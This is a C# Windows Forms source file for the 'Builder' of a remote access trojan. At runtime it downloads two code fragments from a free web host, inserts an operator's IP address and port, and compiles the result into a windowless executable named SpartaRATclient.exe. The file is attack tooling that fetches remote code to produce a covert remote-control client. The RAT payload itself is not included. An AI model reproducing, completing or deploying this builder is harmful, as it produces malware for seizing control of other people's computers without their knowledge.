using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp23
{
    public partial class Builder : Form
    {
        public int port { get; set; }
        public Builder()
        {
            InitializeComponent();
            

            ipaddress.ReadOnly = false;
            this.StartPosition = FormStartPosition.CenterScreen;
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.FileName = "powershell.exe";
            string command = @"Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress";
            p.StartInfo.Arguments = command;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            p.WaitForExit();
            ipaddress.ReadOnly = true;
            ipaddress.Text = "127.0.0.1";




        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
                System.Net.WebClient wc = new System.Net.WebClient();
                             string yourCodeAsString = wc.DownloadString("https://myproject054.000webhostapp.com/compilecode/part1.txt");
                              yourCodeAsString += ipaddress.Text + '"' + ";" +
                                  "\n";
                              yourCodeAsString += "string port = " + '"' + port + '"' + ";" +
                                  "\n";
            yourCodeAsString += wc.DownloadString("https://myproject054.000webhostapp.com/compilecode/part2.txt");
          

            MessageBox.Show(yourCodeAsString, "The following code will be compile."); //יראה את מה שעומד להתקמפל כביכול
            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            ICodeCompiler icc = codeProvider.CreateCompiler();
            System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
            parameters.CompilerOptions = "/t:winexe";
            parameters.OutputAssembly = path.Text + @"\SpartaRATclient.exe";
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, yourCodeAsString);


            if(results.Output.Count > 0)
            {
                for (int i = 0; i < results.Output.Count; i++)
                    MessageBox.Show(results.Output[i]);
                for (int i = 0; i < results.Errors.Count; i++)
                    MessageBox.Show(i.ToString() + ": " + results.Errors[i].ToString());
            }

            button1.Enabled = false;


        }

        private void label4_Click(object sender, EventArgs e)
        {

        }
    }
}
